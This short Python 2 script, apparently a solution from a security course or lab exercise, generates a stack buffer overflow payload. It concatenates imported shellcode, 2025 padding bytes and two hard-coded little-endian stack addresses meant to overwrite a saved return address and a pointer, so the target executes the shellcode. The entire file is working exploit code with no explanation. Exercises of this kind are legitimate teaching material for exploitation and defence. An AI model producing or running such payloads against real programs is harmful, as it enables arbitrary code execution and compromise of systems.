from shellcode import shellcode
from struct import pack
print shellcode + '\xaa'*2025 + pack("<I", 0xbffe9c58)  + pack("<I", 0xbffea46c) 